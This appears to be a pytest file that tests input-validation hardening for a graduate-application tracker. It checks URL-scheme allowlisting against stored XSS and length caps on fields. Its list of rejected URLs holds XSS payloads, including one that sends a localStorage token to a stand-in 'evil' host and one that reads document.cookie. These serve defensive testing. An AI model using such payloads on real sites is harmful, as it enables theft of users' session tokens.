"""Input-validation hardening: URL-scheme allowlisting and length caps.

Covers the security/validation fixes for stored-XSS-via-URL and unbounded
string storage across the user-editable entities.
"""

import pytest

PROGRAM_PAYLOAD = {
    "school": "MIT",
    "department": "Brain and Cognitive Sciences",
    "degree": "PhD",
    "tier": "reach",
    "status": "researching",
}

# --- URL scheme allowlisting ---

DANGEROUS_URLS = [
    "javascript:alert(document.cookie)",
    "javascript:fetch('//evil/'+localStorage.dossier_token)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "  javascript:alert(1)",  # leading whitespace shouldn't smuggle a scheme
]


@pytest.fixture()
def program(client):
    return client.post("/programs", json=PROGRAM_PAYLOAD).json()


@pytest.mark.parametrize("bad_url", DANGEROUS_URLS)
def test_program_rejects_dangerous_url(client, bad_url):
    resp = client.post("/programs", json={**PROGRAM_PAYLOAD, "url": bad_url})
    assert resp.status_code == 422


def test_program_accepts_http_and_https_urls(client):
    for url in ("http://mit.edu", "https://mit.edu/phd"):
        resp = client.post("/programs", json={**PROGRAM_PAYLOAD, "url": url})
        assert resp.status_code == 201, url
        assert resp.json()["url"] == url


def test_program_url_clearable_with_null(client, program):
    resp = client.patch(f"/programs/{program['id']}", json={"url": None})
    assert resp.status_code == 200
    assert resp.json()["url"] is None


@pytest.mark.parametrize("bad_url", DANGEROUS_URLS)
def test_advisor_rejects_dangerous_url(client, program, bad_url):
    resp = client.post(
        f"/programs/{program['id']}/advisors",
        json={"name": "Prof. X", "url": bad_url},
    )
    assert resp.status_code == 422


@pytest.mark.parametrize("bad_url", DANGEROUS_URLS)
def test_document_rejects_dangerous_url(client, program, bad_url):
    resp = client.post(
        f"/programs/{program['id']}/documents",
        json={"kind": "sop", "title": "My SOP", "url": bad_url},
    )
    assert resp.status_code == 422


def test_document_accepts_https_url(client, program):
    resp = client.post(
        f"/programs/{program['id']}/documents",
        json={"kind": "sop", "title": "My SOP", "url": "https://drive.example/x"},
    )
    assert resp.status_code == 201


# --- Length caps ---


def test_program_rejects_overlong_short_field(client):
    resp = client.post("/programs", json={**PROGRAM_PAYLOAD, "school": "A" * 201})
    assert resp.status_code == 422


def test_program_accepts_max_length_short_field(client):
    resp = client.post("/programs", json={**PROGRAM_PAYLOAD, "school": "A" * 200})
    assert resp.status_code == 201


def test_program_rejects_overlong_notes(client):
    resp = client.post("/programs", json={**PROGRAM_PAYLOAD, "notes": "x" * 5001})
    assert resp.status_code == 422


def test_program_rejects_overlong_url(client):
    long_url = "https://example.com/" + "a" * 2100
    resp = client.post("/programs", json={**PROGRAM_PAYLOAD, "url": long_url})
    assert resp.status_code == 422


def test_recommender_rejects_overlong_name(client):
    resp = client.post("/recommenders", json={"name": "N" * 201})
    assert resp.status_code == 422


def test_requirement_rejects_overlong_label(client, program):
    resp = client.post(
        f"/programs/{program['id']}/requirements",
        json={"label": "L" * 201, "kind": "sop"},
    )
    assert resp.status_code == 422
